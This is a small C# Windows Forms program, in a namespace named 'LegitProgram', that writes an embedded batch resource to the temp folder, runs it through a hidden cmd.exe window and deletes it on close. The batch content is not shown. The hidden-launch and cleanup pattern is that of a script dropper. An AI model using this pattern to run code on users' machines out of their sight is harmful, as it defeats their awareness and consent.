using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace LegitProgram
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string batchpath = Path.GetTempPath() + "file.bat";

        private void button1_Click_1(object sender, EventArgs e)
        {
            method();
        }

        private void method()
        {
            File.WriteAllText(batchpath, Properties.Resources.file);

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.Arguments = "/k \"" + batchpath + "\"";
            p.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            File.Delete(batchpath);
        }
    }
}
